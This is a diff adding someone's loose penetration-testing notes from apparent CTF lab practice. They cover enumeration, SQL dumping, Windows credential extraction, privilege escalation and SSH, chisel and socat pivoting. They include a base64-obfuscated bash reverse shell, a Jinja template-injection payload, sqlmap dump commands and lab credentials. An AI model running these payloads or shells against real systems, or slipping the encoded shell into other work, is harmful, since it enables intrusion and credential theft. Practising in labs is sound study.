@@ -1,0 +1,168 @@
+ftp anonymous login with empty password
+
+ssh first thing to do export TERM=xterm
+
+banner grabbing with nc ip port
+
+vhost enum with curl --resolve hostname:port:ip website
+can use without http just ip
+
+nikto can be better than gobuster but takes time
+
+curl -I it is used to check response codes
+
+get payload should be run in metasploit
+
+war file format is a type of zip
+unzip -d
+
+metasploit multi/handler then set payload
+
+you can't use staged payload with netcat
+
+echo something something | base64 it can only take files as args so we need to use pipe
+base64 -w0 to get everything in one line which is not pain in the ass
+no special characters in base64 like +
+
+echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICAmPi9kZXYvdGNwLzEwLjEwLjE2LjUvOTAwMSA8JjEnCg== | base64 -d | bash
+{{ cycler.__init__.__globals__.os.popen('id').read() }} python flash jinja ssti
+
+revshells.com gtofbins crackstation
+
+stty raw -echo use bash for reverse shells not fish
+
+sqlmap -r /home/eren/goodgames.req -dbs -D main -T user -C name --dump
+
+don't forget gobuster when everything seems like there is no way
+
+i need to search for joomla public endpoint to get the version info like how do i know that shit beforehand
+idk why robots.txt exists and in which services it exists
+
+mysql - show databases; use joomla; show tables; describe sd4fg_users; select username, email, password from sd4fg_users;
+sqlmap -r /home/eren/goodgames.req --dbs; -D main --tables; -D main -T user --columns; --D main -T user -C name --dump
+
+apport-cli -f this saved the day
+
+when you don't know how to exploit a service just search for its version you will some kind of info
+don't forget the --help it may seem it doesn't have anything to offer you have to look deep
+don't forget the website headers they sometimes reveal vhost that tools miss
+
+interesting files /etc/passwd /proc/self/cmdline /proc/self/environ /proc/self/stat /proc/num/cmdline /proc/num/environ
+/proc/self/cwd/.env
+
+maybe useful to find writeable files find . -writable
+
+a good way to find details about a service is to look at source code
+
+pspy64 is a program to spy on other programs without root that is.
+
+exiftool is a type of metadata editor not like vim or anything but cli
+
+i know how to get a stable shell get a pty and stty raw -echo and the rev shell should run bash not fish
+
+find . -type f just to look for files with creds in base directories like the users home a handy github like hacktricks
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md
+
+impacket-psexec adm1n@10.10.11.106
+
+evil-winrm -i 10.10.11.106 -u adm1n -p P@ssw0rd -s ./ -e ./
+
+impacket-rpcdump @10.10.11.106
+
+crackmapexec smb 10.10.11.106 -u adm1n -p P@ssw0rd --shares
+
+/dev/shm is faster than /tmp
+
+don't forget the config files of the exploited services
+
+impacket-secretsdump -sam sam -system system local
+
+netexec smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares --users when you creds use this to enumerate users
+
+impacket-lookupsid anonymous@10.10.11.35 when you don't have creds use this to enumerate users
+
+reg save hklm\sam sam and system
+
+I don't quite understand the curl shenanigans used in 2million
+
+python3 -m http.server 80 to start a simple http server to share files this is download only
+
+pipx install uploadserver and curl -F "files=@file-name" ip:port/file-name this is upload and download server but the curl
+may not be found in windows
+
+python3 -m pyftpdlib -p 21 -w -d /ftp/server/dir to start ftp server in the current dir to share files
+
+Invoke-WebRequest http://IP/file -outfile name short powershell iwr http://IP/file -outfile name
+
+certutil -urlcache -f http://IP/file name to download files in windows
+
+impacket-smbserver share-name /folder to start an smb server without auth this could act as upload and download server and
+the most convenient way to upload files from windows to linux
+
+copy \\IP\share\file file-name or vice versa to download files from smbserver in windows
+
+strace binary-name | grep -i "no such file" can be used to check every call a binary makes and you can check the specific
+shared librarys to privesc this is very niece
+
+strings binary-name to check for strings in binary for path-hijacking this too is very niece
+
+crontab -l to list crontabs
+
+gcc -fPIC -shared libray_path.c -o /tmp/libcrypt.so.1
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 but it should have suid bit set
+
+getcap -r / 2>/dev/null. it lists any binaries with special capabilitites
+
+ssh -L localport:target-ip:target-port -i id_rsa -fN user@target. the target-ip and target-port are evaluated in the
+perspective of the machine you are sshing into. like localhost will not be your localhost it is targets localhost and
+lets say there is 10.10.10.2 which only target can access that will be the target-ip and even if you don't have access
+to it the port will be forwarded in the perspective of the user@target which do has access to the 10.10.10.10.
+
+ssh -R remoteport:target-ip:target-port attcker@kali. the remoteport is opened in the machine you are sshing into.
+the target-ip and target-port are evaluated in the perspective of the machine you are running command from.
+it is used to expose targets service port to attacker also when attacker can't ssh into taget but target can ssh
+into attacker, firewall allows inbound connections are allowed not outbound.
+
+ssh -D 9050 user@target. this command is run from the attackers machine. it is technically a forward proxy.
+now you can directly access the internal network, the user@target had access to, but you need a prefix before
+tools to let your tools access that internal network like proxychains curl 10.10.10.2:80.
+
+
+ssh -R 9050 user@target. this command is run from the pivot machine. it is technically a reverse proxy.
+now you can directly access the internal network, the user@target had access to, but you need a prefix before
+tools to let your tools access that internal network like proxychains curl 10.10.10.2:80.
+
+chisel local port forwarding and pivoting. chisel server -p 8080 should be run on the pivot machine that we have access
+and it has access to internal networks. chisel client 192.168.122.252:8080 9001:10.10.10.2:8000 should be run from the
+attackers machine, the 192.168.122.252:8080 is used to connect to chisel server, it opens the port 9001 on the machine
+you are running the command and 10.10.10.2:8000 is evaluated from the perspective of server which is the pivot machine that
+has access to internal network.
+
+chisel remote port forwarding and pivoting. chisel server -p 8080 --reverse should be run on the attackers machine so that
+target connects to us. chisel client 192.168.122.1:8080 R:9001:10.10.10.2:8000 should be run from the pivot machine as it
+is the link b/w attacker and internal network. the 192.168.122.1:8080 is used to connect to chisel server. the 9001 port
+is opened on the server which is attackers machine and 10.10.10.2:8000 is evaluated in the perspective of the client which
+is the pivot that has access to internal network.
+
+chisel socks proxy, dynamic port selection and pivoting. chisel server -p 8080 --socks5 should be run on the pivot machine
+that we have access and it has access to internal networks. chisel client 192.168.122.252:8080 9050:socks should be run
+from the attackers machine. now you can directly access the internal network the pivot machine has access to, but you need
+a prefix before tools to let your tools access that internal network like proxychains curl 10.10.10.2:8000.
+
+chisel reverse socks proxy and pivoting. chisel server -p 8080 --reverse should be run on the attackers machine.
+chisel client 192.168.122.1:8080 R:9050:socks should be run from the pivot machine. now you can directly access the
+internal network the user@target had access to, but you need a prefix before tools to let your tools access that internal
+network like proxychains curl 10.10.10.2:8000.
+
+socat only connects two ports from internal network machines port to the local machine port or local listening port like
+127.0.0.1:8000 to a different network interface port where our attacker machine can reach.
+
+socat TCP-LISTEN:9001,reuseaddr,fork TCP:localhost:80 this should be run on the pivot machine where a local server is
+listening at 80, with this command the port 80 is available at all interfaces 0.0.0.0:80.
+
+socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.10.10.2:80 this should be run on the pivot machine where the pivot machine has
+access to an internal network. the port of internal network machine is forwarded to pivot machines 9001 port which is be
+accessible by our attackers machine
+
+maybe get a low privilige acc on metasploitable3 and run winpeas services
